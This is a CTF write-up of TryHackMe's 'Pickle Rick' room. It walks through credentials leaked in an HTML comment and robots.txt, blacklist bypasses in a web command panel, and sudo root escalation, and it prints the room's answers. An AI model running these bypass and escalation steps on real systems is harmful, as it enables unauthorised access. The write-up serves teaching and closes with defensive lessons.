---
title: "TryHackMe: Pickle Rick — Web Recon, Command Injection Filter Bypasses & Sudo PrivEsc"
author: parthpandey
categories: [TryHackMe, Case-Studies]
tags: [linux, web, ctf, command-injection, filter-bypass, sudo-privesc, case-study]
render_with_liquid: false
date: 2026-10-18 21:40:00 +0530
---

**Pickle Rick** is a wildly popular CTF challenge simulating a Rick and Morty-themed penetration test. This case study analyzes source code recon, information disclosure via `robots.txt`, exploiting a web-based command execution interface by circumventing Linux command blacklists, and leveraging misconfigured `sudo` privileges to achieve total system takeover.

---

## Room Metadata

| Attribute | Specification |
|:---|:---|
| **Platform** | TryHackMe |
| **Room URL** | [tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick) |
| **Target OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Target Objectives** | Retrieve Ingredient 1, Ingredient 2, and Ingredient 3 (Root Flag) |
| **Key Vectors** | Source Code Information Disclosure, `robots.txt` credential exposure, Web Command Panel Injection, Input Filter Bypass, Sudoers Misconfiguration |

---

## The Attack Kill Chain

```
[Phase 1: Source Reconnaissance & Discovery]
   │── View Page Source (Ctrl+U) on http://target/
   │     <!-- Note to self: username is 'R1ckRul3s' -->
   └── Inspect http://target/robots.txt:
         Wubbalubbadubdub (Acts as plaintext password!)
         │
[Phase 2: Authentication & Web Panel Access]
   │── Locate administrative interface: /login.php
   │── Authenticate with: R1ckRul3s / Wubbalubbadubdub
   └── Redirected to: /portal.php (Command Execution Panel)
         │
[Phase 3: Bypassing Command Execution Filters]
   │── Executing 'ls -la' reveals: Sup3rS3cretPickl3Ingred.txt
   │── Executing 'cat Sup3rS3cretPickl3Ingred.txt' -> Blocked: "Command disabled to prevent hacking"
   │── Filter Bypasses:
   │     Approach A: 'less Sup3rS3cretPickl3Ingred.txt' ──> Ingredient 1 Found
   │     Approach B: 'awk 1 Sup3rS3cretPickl3Ingred.txt'
   │     Approach C: 'base64 Sup3rS3cretPickl3Ingred.txt | base64 -d'
   │── Enumerate /home/rick:
   │     less "/home/rick/second ingredients" ──> Ingredient 2 Found
         │
[Phase 4: Privilege Escalation]
   │── Check permissions: 'sudo -l'
   │     (ALL) NOPASSWD: ALL
   └── Execute: 'sudo /bin/bash -c "cat /root/3rd.txt"' ──> Final Ingredient Captured (#)
```

---

## Phase 1: Reconnaissance & Source Inspection

An Nmap scan reveals open ports 22 (SSH) and 80 (HTTP):

```console
$ nmap -sC -sV -p 22,80 10.10.115.68
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Inspecting HTML Source
Navigating to `http://10.10.115.68/` and viewing the HTML source code reveals an uncleaned developer comment:

```html
<!-- Note to self, remember username!
     Username: R1ckRul3s -->
```

### Checking `robots.txt`
Navigating to `http://10.10.115.68/robots.txt`:

```
Wubbalubbadubdub
```

This string matches Rick's catchphrase and appears to be a password.

---

## Phase 2: Administrative Portal Access

Navigating to `http://10.10.115.68/login.php` displays a login form. Entering:
- **Username**: `R1ckRul3s`
- **Password**: `Wubbalubbadubdub`

Authentication is successful, redirecting to `portal.php`, which provides an interactive web-based bash command console.

---

## Phase 3: Bypassing Web Command Filters

Testing basic command execution:

```console
Command: ls -la
```

Output:
```
total 40
drwxr-xr-x 3 root root 4096 Feb 10  2019 .
drwxr-xr-x 3 root root 4096 Feb 10  2019 ..
-rwxr-xr-x 1 root root   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxr-xr-x 2 root root 4096 Feb 10  2019 assets
-rwxr-xr-x 1 root root   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 root root 1105 Feb 10  2019 denied.php
-rwxr-xr-x 1 root root 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 root root 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 root root 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 root root   17 Feb 10  2019 robots.txt
```

### Testing File Read Commands
Attempting to read `Sup3rS3cretPickl3Ingred.txt`:

```console
Command: cat Sup3rS3cretPickl3Ingred.txt
```

Response:
> **"Command disabled to make things more interesting :)"**

The application employs a command blacklist that filters common strings like `cat`, `head`, `tail`, `more`, and `nano`.

### Bypassing the Blacklist
There are several ways to bypass string-based command filtering in Linux:

#### 1. Using `less`
```console
Command: less Sup3rS3cretPickl3Ingred.txt
```
Output:
```
mr. meeseek hair
```
*(Ingredient 1 Acquired)*

#### 2. Using `awk`
```console
Command: awk 1 Sup3rS3cretPickl3Ingred.txt
```

#### 3. Using `nl` (Number Lines)
```console
Command: nl Sup3rS3cretPickl3Ingred.txt
```

#### 4. Using Base64 Encoding
```console
Command: base64 Sup3rS3cretPickl3Ingred.txt
```

### Finding Ingredient 2
We inspect `clue.txt`:

```console
Command: less clue.txt
```
Output:
```
Look around the file system for the other ingredient.
```

Let's inspect `/home`:

```console
Command: ls -la /home/rick
```
Output:
```
-rwxrwxrwx 1 root root 13 Feb 10  2019 second ingredients
```

Read the file using `less`:

```console
Command: less "/home/rick/second ingredients"
```
Output:
```
1 jerry tear
```
*(Ingredient 2 Acquired)*

---

## Phase 4: Privilege Escalation via Sudo Misconfiguration

Let's test what commands the web server user (`www-data`) can execute with `sudo`:

```console
Command: sudo -l
```

Output:
```
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
```

`www-data` has uninhibited `sudo` privileges without a password requirement!

### Extracting the Final Ingredient (Root Flag)
We can execute arbitrary commands directly as root:

```console
Command: sudo ls -la /root
```
Output:
```
total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Feb 10  2019 ..
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
```

Read the final flag:

```console
Command: sudo less /root/3rd.txt
```
Output:
```
fleeb juice
```
*(Ingredient 3 / Root Flag Acquired)*

---

## Technical Lessons & Defensive Takeaways

1. **Information Leakage in Production**:
   - Comments containing credentials or developer notes must be stripped during build and minification pipelines.
   - `robots.txt` should never contain sensitive strings or internal paths; it is publicly readable by design.

2. **Flawed Blacklist Defenses**:
   - Blocking specific command names (`cat`, `nano`) provides zero actual security. Attackers can leverage dozens of standard Unix binaries (`awk`, `less`, `sed`, `xxd`, `dd`, `tar`, `python`) to achieve identical results.
   - User input should never be passed directly into system shell functions like `system()`, `passthru()`, or `shell_exec()`.

3. **Insecure Sudoers Configuration**:
   - Granting `(ALL) NOPASSWD: ALL` to a web server account (`www-data`) negates all Linux operating system boundaries. Web services should run under strictly sandboxed service accounts with minimal filesystem read/write privileges.

